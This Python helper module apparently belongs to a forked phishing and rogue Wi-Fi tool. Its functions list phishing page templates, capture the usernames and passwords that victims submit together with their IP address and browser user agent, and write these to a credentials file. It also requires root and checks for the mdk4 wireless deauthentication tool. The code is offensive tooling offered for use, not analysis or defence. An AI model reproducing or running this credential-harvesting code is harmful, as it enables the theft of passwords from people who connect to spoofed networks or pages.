"""
Original Author : https://github.com/karthi-the-hacker
Fork Author     : https://github.com/minefarts
"""
from philh_myftp_biz.web import socket
from rich.console import Console
from datetime import datetime
from rich.panel import Panel
from includes import banner
import os, json, subprocess
from shutil import which

console = Console()

def kill_port(port):
    try:
        
        # macOS/Linux
        output = subprocess.check_output(
            f"lsof -t -i:{port}",
            shell = True
        )

        pids = output.decode().strip().split("\n")
        for pid in pids:
            subprocess.run(["kill", "-9", pid])
            print(f"[!] Killed process {pid} on port {port}")

    except subprocess.CalledProcessError:
        pass  # No process is using the port

def getip():
    try:

        # Connect to an external IP (doesn't have to be reachable)
        s = socket()

        s.connect(("8.8.8.8", 80))  # Google's DNS

        ip: str = s.getsockname()[0]
        
        s.close()

        # Check for 192 or fallback to 172
        if ip.startswith("192.") or ip.startswith("172."):
            return ip
        
    except Exception:
        pass

    return "127.0.0.1"  # fallback if nothing works

def choose_template():

    banner.show_banner()
    
    template_dir = "templates"
    templates = [name for name in os.listdir(template_dir) if os.path.isdir(os.path.join(template_dir, name))]

    if not templates:
        print("❌ No templates found.")
        return None

    # Build the list in a single string
    template_list = "\n".join(f"[cyan]{i + 1}[/cyan]. {name}" for i, name in enumerate(templates))

    # Display in a single panel
    console.print(Panel.fit(
        f"🎭 [bold yellow]Available Templates[/bold yellow]\n\n{template_list}",
        border_style="magenta"
    ))

    while True:

        choice = input("🔢 Select template number (or 0 to go back): ")
        if choice.isdigit():

            choice = int(choice)
            if choice == 0:
                return None

            elif 1 <= choice <= len(templates):
                return templates[choice - 1]

        print("❌ Invalid choice. Try again.")

def post_data(data, self):

    username = data.get("username", [""])[0]
    password = data.get("password", [""])[0]
    client_ip = self.client_address[0]
    user_agent = self.headers.get('User-Agent', '')
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    return {
        "username": username,
        "password": password,
        "template": os.path.basename(os.getcwd()),
        "datetime": timestamp,
        "ip": client_ip,
        "useragent": user_agent
    }

def savecred(all_data,CRED_FILE):

    with open(os.getcwd()+CRED_FILE, "w") as f:
        json.dump(all_data, f, indent=4)
        
    print(f"[+] Credentials saved to file.  {os.path.abspath(os.getcwd()+CRED_FILE)}")

def check_sudo():
    if os.geteuid() != 0:
        console.print("[red]❌ This script must be run as root (sudo).[/red]")
        exit()

def check_mdk4():

    if which("mdk4") is None:
        console.print("[red]❌ mdk4 is not installed. Install it using:[/red] [yellow]sudo apt install mdk4[/yellow]")
        exit()

    else:
        console.print("[green]✅ mdk4 found.[/green]")
